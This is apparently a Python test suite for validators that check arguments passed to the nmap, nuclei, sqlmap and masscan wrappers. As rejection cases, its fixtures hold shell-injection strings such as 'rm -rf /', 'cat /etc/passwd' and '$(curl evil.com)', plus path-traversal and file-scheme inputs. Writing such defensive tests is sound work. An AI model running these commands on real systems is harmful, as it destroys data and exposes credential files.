"""
Comprehensive test suite for the KAISON AI subprocess argument validator framework.

Coverage categories per validator:
  1. Happy path           – valid inputs pass and are returned unchanged (or coerced)
  2. Boundary min/max     – exact min and max accepted; min-1 and max+1 rejected
  3. Type coercion        – string "100" accepted for int fields; float rejected
  4. Injection attempts   – shell metacharacters, null bytes, unicode control chars
  5. Path traversal       – ../ sequences, absolute escapes, symlink-based traversal
  6. Enum rejection       – unknown values produce clear error messages
  7. CIDR / URL rejection – bad schemes, missing hosts, malformed CIDR notation
  8. Registry behaviour   – dispatch, unknown tool, custom self-registration
"""
import tempfile
import pytest

from core.tool_adapters.validators import (
    NmapValidator,
    NucleiValidator,
    MasscanValidator,
    SqlmapValidator,
    ToolValidator,
    register,
    validate_tool_options,
)


# ---------------------------------------------------------------------------
# Shared fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def valid_nuclei_options():
    return {
        "tags": "cve,osint",
        "rate_limit": 100,
        "timeout": 30,
        "severity": "critical,high",
    }


@pytest.fixture
def valid_nmap_options():
    return {"ports": "80,443,8080-9090", "timing": 3, "script": "http-headers"}


@pytest.fixture
def valid_sqlmap_options():
    return {
        "url": "https://example.com/search?q=test",
        "level": 2,
        "risk": 1,
        "threads": 5,
        "technique": "BEU",
    }


@pytest.fixture
def valid_masscan_options():
    return {
        "ports": "80,443,1-1000",
        "rate": 1000,
        "excludes": ["10.0.0.0/8", "192.168.1.0/24"],
    }


@pytest.fixture(params=[
    "; rm -rf /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "\x00null",
    "\nnewline",
    "$(curl evil.com)",
    "& background",
    "> /etc/cron.d/evil",
    "\t tab",
])
def injection_string(request):
    return request.param


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

class TestRegistry:
    def test_all_four_tools_registered(self):
        for tool in ("nuclei", "nmap", "sqlmap", "masscan"):
            result = validate_tool_options(tool, {})
            assert isinstance(result, dict)

    def test_unknown_tool_raises_key_error(self):
        with pytest.raises(KeyError, match="unknown_tool_xyz"):
            validate_tool_options("unknown_tool_xyz", {})

    def test_empty_options_returned_as_is(self):
        for tool in ("nuclei", "nmap", "sqlmap", "masscan"):
            assert validate_tool_options(tool, {}) == {}

    def test_custom_tool_self_registers(self):
        @register("_test_tool_register_abc")
        class _DummyValidator(ToolValidator):
            def validate(self, options):
                return options

        result = validate_tool_options("_test_tool_register_abc", {"x": 1})
        assert result == {"x": 1}

    def test_options_dict_is_copied_not_mutated(self):
        original = {"rate_limit": "150"}
        validate_tool_options("nuclei", original)
        assert original["rate_limit"] == "150"  # original unchanged


# ---------------------------------------------------------------------------
# ToolValidator._coerce_int (tested via NucleiValidator as a proxy)
# ---------------------------------------------------------------------------

class TestCoerceInt:
    def setup_method(self):
        self.v = NucleiValidator()

    def test_int_value_returned_unchanged(self):
        assert self.v._coerce_int(5, "x", 1, 10) == 5

    def test_digit_string_coerced_to_int(self):
        assert self.v._coerce_int("5", "x", 1, 10) == 5

    def test_float_rejected(self):
        with pytest.raises(ValueError, match="float not accepted"):
            self.v._coerce_int(5.5, "x", 1, 10)

    def test_non_numeric_string_rejected(self):
        with pytest.raises(ValueError, match="expected integer"):
            self.v._coerce_int("abc", "x", 1, 10)

    def test_none_rejected(self):
        with pytest.raises(ValueError, match="expected integer"):
            self.v._coerce_int(None, "x", 1, 10)

    def test_exact_min_accepted(self):
        assert self.v._coerce_int(1, "x", 1, 10) == 1

    def test_exact_max_accepted(self):
        assert self.v._coerce_int(10, "x", 1, 10) == 10

    def test_below_min_rejected(self):
        with pytest.raises(ValueError, match="must be"):
            self.v._coerce_int(0, "x", 1, 10)

    def test_above_max_rejected(self):
        with pytest.raises(ValueError, match="must be"):
            self.v._coerce_int(11, "x", 1, 10)


# ---------------------------------------------------------------------------
# ToolValidator._validate_ports (shared between nmap and masscan)
# ---------------------------------------------------------------------------

class TestValidatePorts:
    def setup_method(self):
        self.v = NmapValidator()

    def test_single_port(self):
        assert self.v._validate_ports("80", "ports") == "80"

    def test_port_range(self):
        assert self.v._validate_ports("1-65535", "ports") == "1-65535"

    def test_comma_list(self):
        assert self.v._validate_ports("22,80,443", "ports") == "22,80,443"

    def test_mixed_ports_and_ranges(self):
        assert self.v._validate_ports("22,80,443,8080-9090", "ports") == "22,80,443,8080-9090"

    def test_port_zero_rejected(self):
        with pytest.raises(ValueError, match="out of range"):
            self.v._validate_ports("0", "ports")

    def test_port_65536_rejected(self):
        with pytest.raises(ValueError, match="out of range"):
            self.v._validate_ports("65536", "ports")

    def test_reversed_range_rejected(self):
        with pytest.raises(ValueError, match="start .* > end"):
            self.v._validate_ports("100-80", "ports")

    def test_empty_string_rejected(self):
        with pytest.raises(ValueError, match="must not be empty"):
            self.v._validate_ports("", "ports")

    def test_too_many_segments_rejected(self):
        big = ",".join(str(i) for i in range(1, 102))  # 101 segments
        with pytest.raises(ValueError, match="too many port segments"):
            self.v._validate_ports(big, "ports")

    def test_exactly_100_segments_accepted(self):
        ok = ",".join(str(i) for i in range(1, 101))  # 100 segments
        assert self.v._validate_ports(ok, "ports") == ok

    def test_non_string_rejected(self):
        with pytest.raises(ValueError, match="expected str"):
            self.v._validate_ports(80, "ports")

    def test_injection_chars_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v._validate_ports(injection_string, "ports")

    def test_malformed_double_dash_rejected(self):
        with pytest.raises(ValueError):
            self.v._validate_ports("80--100", "ports")

    def test_trailing_dash_rejected(self):
        with pytest.raises(ValueError):
            self.v._validate_ports("80-", "ports")


# ---------------------------------------------------------------------------
# NucleiValidator
# ---------------------------------------------------------------------------

class TestNucleiValidator:
    def setup_method(self):
        self.v = NucleiValidator()

    # Happy path
    def test_happy_path(self, valid_nuclei_options):
        result = self.v.validate(valid_nuclei_options)
        assert result["tags"] == "cve,osint"
        assert result["rate_limit"] == 100
        assert result["timeout"] == 30

    def test_empty_options(self):
        assert self.v.validate({}) == {}

    # Tags
    def test_tags_alphanumeric_comma_dash_underscore(self):
        assert self.v.validate({"tags": "cve-2024,osint_recon,web"})["tags"] == "cve-2024,osint_recon,web"

    def test_tags_injection_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v.validate({"tags": injection_string})

    def test_tags_space_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"tags": "cve high"})

    def test_tags_slash_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"tags": "cve/high"})

    # rate_limit
    def test_rate_limit_min_boundary(self):
        assert self.v.validate({"rate_limit": 1})["rate_limit"] == 1

    def test_rate_limit_max_boundary(self):
        assert self.v.validate({"rate_limit": 1000})["rate_limit"] == 1000

    def test_rate_limit_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"rate_limit": 0})

    def test_rate_limit_1001_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"rate_limit": 1001})

    def test_rate_limit_string_coerced(self):
        assert self.v.validate({"rate_limit": "150"})["rate_limit"] == 150

    def test_rate_limit_float_rejected(self):
        with pytest.raises(ValueError, match="float not accepted"):
            self.v.validate({"rate_limit": 150.5})

    # timeout
    def test_timeout_min_boundary(self):
        assert self.v.validate({"timeout": 1})["timeout"] == 1

    def test_timeout_max_boundary(self):
        assert self.v.validate({"timeout": 300})["timeout"] == 300

    def test_timeout_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"timeout": 0})

    def test_timeout_301_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"timeout": 301})

    def test_timeout_string_coerced(self):
        assert self.v.validate({"timeout": "60"})["timeout"] == 60

    # severity
    def test_severity_single_valid(self):
        for sev in ("critical", "high", "medium", "low", "info"):
            assert self.v.validate({"severity": sev})["severity"] == sev

    def test_severity_comma_list_valid(self):
        assert self.v.validate({"severity": "critical,high,medium"})["severity"] == "critical,high,medium"

    def test_severity_unknown_rejected(self):
        with pytest.raises(ValueError, match="must be one of"):
            self.v.validate({"severity": "blocker"})

    def test_severity_injection_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"severity": "critical; rm -rf /"})

    # templates path
    def test_template_valid_relative_path(self, tmp_path, monkeypatch):
        monkeypatch.setattr(NucleiValidator, "_TEMPLATES_BASE", str(tmp_path))
        (tmp_path / "cves").mkdir()
        result = self.v.validate({"templates": "cves"})
        assert result["templates"] == str(tmp_path / "cves")

    def test_template_dotdot_traversal_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setattr(NucleiValidator, "_TEMPLATES_BASE", str(tmp_path))
        with pytest.raises(ValueError, match="path traversal"):
            self.v.validate({"templates": "../etc/passwd"})

    def test_template_absolute_outside_base_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setattr(NucleiValidator, "_TEMPLATES_BASE", str(tmp_path))
        with pytest.raises(ValueError, match="path traversal"):
            self.v.validate({"templates": "/etc/passwd"})

    def test_template_symlink_traversal_rejected(self, tmp_path, monkeypatch):
        monkeypatch.setattr(NucleiValidator, "_TEMPLATES_BASE", str(tmp_path))
        link = tmp_path / "escape"
        link.symlink_to("/tmp")  # /tmp is outside tmp_path
        with pytest.raises(ValueError, match="path traversal"):
            self.v.validate({"templates": "escape"})


# ---------------------------------------------------------------------------
# NmapValidator
# ---------------------------------------------------------------------------

class TestNmapValidator:
    def setup_method(self):
        self.v = NmapValidator()

    def test_happy_path(self, valid_nmap_options):
        result = self.v.validate(valid_nmap_options)
        assert result["ports"] == "80,443,8080-9090"
        assert result["timing"] == 3

    def test_ports_single(self):
        assert self.v.validate({"ports": "80"})["ports"] == "80"

    def test_ports_full_range(self):
        assert self.v.validate({"ports": "1-65535"})["ports"] == "1-65535"

    def test_ports_injection_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v.validate({"ports": injection_string})

    # timing
    def test_timing_min_boundary(self):
        assert self.v.validate({"timing": 0})["timing"] == 0

    def test_timing_max_boundary(self):
        assert self.v.validate({"timing": 5})["timing"] == 5

    def test_timing_6_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"timing": 6})

    def test_timing_negative_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"timing": -1})

    def test_timing_string_coerced(self):
        assert self.v.validate({"timing": "3"})["timing"] == 3

    # script
    def test_script_single_name(self):
        assert self.v.validate({"script": "http-headers"})["script"] == "http-headers"

    def test_script_comma_list(self):
        assert self.v.validate({"script": "http-headers,ssl-cert"})["script"] == "http-headers,ssl-cert"

    def test_script_path_separator_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"script": "../../../etc/cron.d/evil"})

    def test_script_forward_slash_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"script": "scripts/http-headers"})

    def test_script_injection_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v.validate({"script": injection_string})


# ---------------------------------------------------------------------------
# SqlmapValidator
# ---------------------------------------------------------------------------

class TestSqlmapValidator:
    def setup_method(self):
        self.v = SqlmapValidator()

    def test_happy_path(self, valid_sqlmap_options):
        result = self.v.validate(valid_sqlmap_options)
        assert result["url"] == "https://example.com/search?q=test"
        assert result["level"] == 2
        assert result["risk"] == 1

    # URL / target
    def test_http_url_accepted(self):
        assert self.v.validate({"url": "http://example.com/"})["url"] == "http://example.com/"

    def test_https_url_accepted(self):
        assert self.v.validate({"url": "https://example.com/"})["url"] == "https://example.com/"

    def test_file_scheme_rejected(self):
        with pytest.raises(ValueError, match="only http/https"):
            self.v.validate({"url": "file:///etc/passwd"})

    def test_ftp_scheme_rejected(self):
        with pytest.raises(ValueError, match="only http/https"):
            self.v.validate({"url": "ftp://evil.com/"})

    def test_gopher_scheme_rejected(self):
        with pytest.raises(ValueError, match="only http/https"):
            self.v.validate({"url": "gopher://evil.com/"})

    def test_url_missing_host_rejected(self):
        with pytest.raises(ValueError, match="missing host"):
            self.v.validate({"url": "https://"})

    def test_target_key_also_validated(self):
        with pytest.raises(ValueError, match="only http/https"):
            self.v.validate({"target": "file:///etc/passwd"})

    def test_idn_url_accepted(self):
        result = self.v.validate({"url": "https://münchen.de/path"})
        assert result["url"] == "https://münchen.de/path"

    # level
    def test_level_min_boundary(self):
        assert self.v.validate({"level": 1})["level"] == 1

    def test_level_max_boundary(self):
        assert self.v.validate({"level": 5})["level"] == 5

    def test_level_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"level": 0})

    def test_level_6_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"level": 6})

    def test_level_string_coerced(self):
        assert self.v.validate({"level": "3"})["level"] == 3

    # risk
    def test_risk_min_boundary(self):
        assert self.v.validate({"risk": 1})["risk"] == 1

    def test_risk_max_boundary(self):
        assert self.v.validate({"risk": 3})["risk"] == 3

    def test_risk_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"risk": 0})

    def test_risk_4_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"risk": 4})

    # threads
    def test_threads_min_boundary(self):
        assert self.v.validate({"threads": 1})["threads"] == 1

    def test_threads_max_boundary(self):
        assert self.v.validate({"threads": 10})["threads"] == 10

    def test_threads_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"threads": 0})

    def test_threads_11_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"threads": 11})

    # technique
    def test_technique_all_valid_chars(self):
        result = self.v.validate({"technique": "BEUSTQ"})
        assert result["technique"] == "BEUSTQ"

    def test_technique_lowercase_uppercased(self):
        assert self.v.validate({"technique": "beu"})["technique"] == "BEU"

    def test_technique_invalid_char_rejected(self):
        with pytest.raises(ValueError, match="unknown technique characters"):
            self.v.validate({"technique": "BX"})

    def test_technique_injection_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"technique": "B; rm -rf /"})

    def test_technique_non_string_rejected(self):
        with pytest.raises(ValueError, match="expected str"):
            self.v.validate({"technique": 42})

    # cookie
    def test_cookie_valid_printable_ascii(self):
        cookie = "session=abc123; token=xyz789"
        assert self.v.validate({"cookie": cookie})["cookie"] == cookie

    def test_cookie_null_byte_rejected(self):
        with pytest.raises(ValueError, match="null bytes"):
            self.v.validate({"cookie": "session\x00evil"})

    def test_cookie_control_char_rejected(self):
        with pytest.raises(ValueError, match="printable ASCII"):
            self.v.validate({"cookie": "session\x01evil"})

    def test_cookie_del_char_rejected(self):
        with pytest.raises(ValueError, match="printable ASCII"):
            self.v.validate({"cookie": "session\x7feval"})

    def test_cookie_too_long_rejected(self):
        with pytest.raises(ValueError, match="too long"):
            self.v.validate({"cookie": "x" * 4097})

    def test_cookie_exactly_4096_accepted(self):
        result = self.v.validate({"cookie": "x" * 4096})
        assert len(result["cookie"]) == 4096


# ---------------------------------------------------------------------------
# MasscanValidator
# ---------------------------------------------------------------------------

class TestMasscanValidator:
    def setup_method(self):
        self.v = MasscanValidator()

    def test_happy_path(self, valid_masscan_options):
        result = self.v.validate(valid_masscan_options)
        assert result["ports"] == "80,443,1-1000"
        assert result["rate"] == 1000
        assert result["excludes"] == ["10.0.0.0/8", "192.168.1.0/24"]

    # ports (shared logic — spot-check)
    def test_ports_valid(self):
        assert self.v.validate({"ports": "443"})["ports"] == "443"

    def test_ports_injection_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v.validate({"ports": injection_string})

    # rate
    def test_rate_min_boundary(self):
        assert self.v.validate({"rate": 1})["rate"] == 1

    def test_rate_max_boundary(self):
        assert self.v.validate({"rate": 10000})["rate"] == 10000

    def test_rate_zero_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"rate": 0})

    def test_rate_10001_rejected(self):
        with pytest.raises(ValueError):
            self.v.validate({"rate": 10001})

    def test_rate_string_coerced(self):
        assert self.v.validate({"rate": "5000"})["rate"] == 5000

    def test_rate_float_rejected(self):
        with pytest.raises(ValueError, match="float not accepted"):
            self.v.validate({"rate": 1000.5})

    # excludes
    def test_excludes_ipv4_cidr_valid(self):
        result = self.v.validate({"excludes": ["10.0.0.0/8", "192.168.0.0/16"]})
        assert result["excludes"] == ["10.0.0.0/8", "192.168.0.0/16"]

    def test_excludes_ipv6_cidr_valid(self):
        result = self.v.validate({"excludes": ["::1/128", "2001:db8::/32"]})
        assert "::1/128" in result["excludes"]

    def test_excludes_invalid_cidr_rejected(self):
        with pytest.raises(ValueError, match="invalid CIDR"):
            self.v.validate({"excludes": ["not-a-cidr"]})

    def test_excludes_injection_rejected(self, injection_string):
        with pytest.raises(ValueError):
            self.v.validate({"excludes": [injection_string]})

    def test_excludes_non_list_rejected(self):
        with pytest.raises(ValueError, match="expected list"):
            self.v.validate({"excludes": "10.0.0.0/8"})

    def test_excludes_empty_list_accepted(self):
        result = self.v.validate({"excludes": []})
        assert result["excludes"] == []

    def test_excludes_host_cidr_slash32_valid(self):
        result = self.v.validate({"excludes": ["203.0.113.5/32"]})
        assert result["excludes"] == ["203.0.113.5/32"]

    def test_excludes_supernet_valid(self):
        result = self.v.validate({"excludes": ["0.0.0.0/0"]})
        assert result["excludes"] == ["0.0.0.0/0"]
